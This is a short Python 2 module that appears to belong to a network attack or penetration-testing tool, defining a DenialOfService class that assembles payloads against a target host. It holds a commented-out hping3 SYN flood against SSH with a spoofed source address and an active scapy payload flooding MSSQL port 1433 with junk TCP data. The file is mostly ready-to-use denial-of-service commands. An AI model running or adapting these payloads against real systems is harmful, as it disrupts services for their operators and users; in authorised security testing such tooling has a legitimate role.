#!/usr/bin/env python
###
# @author $Author$
# @version $Revision$
# @lastmodified $Date$
#

import ConfigParser

class DenialOfService():
    def __init__(self, target):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read('config.cfg')

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### hping SYN flood against SSH with spoofed IP
        # /!\ Issue: this payload is looping and never stopping...
#        self.payloads.append([
#            "hping SYN flood against SSH with spoofed IP",
#            "command",
#            [self._sudo, self.config.get('PATHS','hping3'), self._target, '-I', 'wlan0', '-a', '192.168.100.10', '-S', '-p', '22', '--flood']
#            ])

        ### DoS against MSSQL
        self.payloads.append([
            "DoS against MSSQL",
            "scapy",
            """sr1(IP(dst="%s")/TCP(dport=1433)/"0"*1000, verbose=0)""" % self._target,
            ""
        ])

        return self.payloads

if __name__ == "__main__":
    print DenialOfService("192.168.100.48").getPayloads()